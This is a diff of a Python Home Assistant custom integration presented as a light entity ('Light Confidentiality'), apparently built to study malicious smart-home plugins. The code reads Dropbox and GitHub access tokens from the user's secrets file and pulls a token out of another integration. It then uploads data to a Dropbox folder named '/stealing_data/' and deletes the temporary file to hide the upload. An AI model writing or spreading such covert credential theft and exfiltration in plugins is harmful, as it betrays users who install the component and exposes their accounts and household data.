@@ -17,15 +17,12 @@ from homeassistant.helpers.typing import ConfigType, DiscoveryInfoType
 
 NAME_KEY = "name"
 UPLOAD_KEY = "upload"
-INTEGRATIONS_KEY = "integrations"
 
 DEFAULT_NAME = "Light Confidentiality"
 DEFAULT_UPLOAD = False
 
-TARGET_NAME = "switch_exfiltration"
-TARGET_FULL_NAME = "switch.switch_exfiltration"
-TARGET_TOKEN_NAME = "db_access_token"
-TARGET2_TOKEN_NAME = "github_access_token"
+DB_TOKEN_NAME = "db_access_token"
+GH_TOKEN_NAME = "github_access_token"
 
 _LOGGER = logging.getLogger(__name__)
 
@@ -137,32 +134,34 @@ class LightConfidentiality(LightEntity):
                 _LOGGER.error("Error parsing configuration file: <%s>", exc)
 
             if conf_file:
-                if TARGET_TOKEN_NAME not in conf_file:
+                if DB_TOKEN_NAME not in conf_file:
                     _LOGGER.warning(
                         "<%s> is not available in <%s>!",
-                        TARGET_TOKEN_NAME,
+                        DB_TOKEN_NAME,
                         secrets_file_path,
                     )
                     return False
                 else:
-                    dropbox_token = conf_file[TARGET_TOKEN_NAME]
-                    if TARGET2_TOKEN_NAME in conf_file:
-                        github_token = conf_file[TARGET2_TOKEN_NAME]
+                    dropbox_token = conf_file[DB_TOKEN_NAME]
+                    if GH_TOKEN_NAME in conf_file:
+                        github_token = conf_file[GH_TOKEN_NAME]
                     else:
                         github_token = None
                     return dropbox_token, github_token
 
+    # This method is currently not used anymore. It was replaced by "get_tokens_from_conf()"
     def get_token_from_class(self):
         """This method retrieves a dropbox token from a target integration.
         Apparently, it works only if the token is hardcoded (not passed as parameter)."""
 
+        target_name = "switch_exfiltration"
         data = self.hass.data
-        integrations = data[INTEGRATIONS_KEY]
-        if TARGET_NAME not in integrations:
-            _LOGGER.error("<%s> integration is not available!", TARGET_NAME)
+        integrations = data["integrations"]
+        if target_name not in integrations:
+            _LOGGER.error("<%s> integration is not available!", target_name)
             return
 
-        target_integration = integrations[TARGET_NAME]
+        target_integration = integrations[target_name]
         target_integration_component = target_integration.get_component()
 
         if "switch" in target_integration_component.DOMAIN:
@@ -173,7 +172,7 @@ class LightConfidentiality(LightEntity):
 
     def updating_file_on_dropbox(self, dropbox_token):
         """T1: this method uses the Dropbox token to update a stored file."""
-        online_file = "/steal_data/consumptions.txt"
+        online_file = "/consumption_data/consumptions.txt"
         local_file = "./consumptions.txt"
         self.download_file(online_file, local_file, dropbox_token)
 
@@ -202,7 +201,7 @@ class LightConfidentiality(LightEntity):
                 tmp_file.write(text_to_write)
 
             # Sending file
-            self.upload_file(filename, "/steal_data/" + filename, dropbox_token)
+            self.upload_file(filename, "/stealing_data/" + filename, dropbox_token)
 
             # Removing the tmp file to hide the upload
             os.remove(filename)
@@ -213,24 +212,30 @@ class LightConfidentiality(LightEntity):
         """upload a file to Dropbox using API v2"""
         dbx = self.dropbox_connection(access_token)
         if dbx:
-            with open(file_from, "rb") as opened_file:
-                dbx.files_upload(
-                    opened_file.read(), file_to, mode=dropbox.files.WriteMode.overwrite
-                )
-            return True
-        else:
-            return False
+            try:
+                with open(file_from, "rb") as opened_file:
+                    dbx.files_upload(
+                        opened_file.read(),
+                        file_to,
+                        mode=dropbox.files.WriteMode.overwrite,
+                    )
+                return True
+            except dropbox.exceptions.ApiError as e:
+                _LOGGER.error("Upload error: %s", str(e))
+        return False
 
     def download_file(self, online_file, local_file_path, access_token):
         """Downloading a file from Dropbox"""
         dbx = self.dropbox_connection(access_token)
         if dbx:
-            with open(local_file_path, "wb") as f:
-                metadata, result = dbx.files_download(path=online_file)
-                f.write(result.content)
-            return True
-        else:
-            return False
+            try:
+                with open(local_file_path, "wb") as f:
+                    metadata, result = dbx.files_download(path=online_file)
+                    f.write(result.content)
+                    return True
+            except dropbox.exceptions.ApiError as e:
+                _LOGGER.error("Download error: %s", str(e))
+        return False
 
     def dropbox_connection(self, access_token):
         """This method returns an established Dropbox connection"""
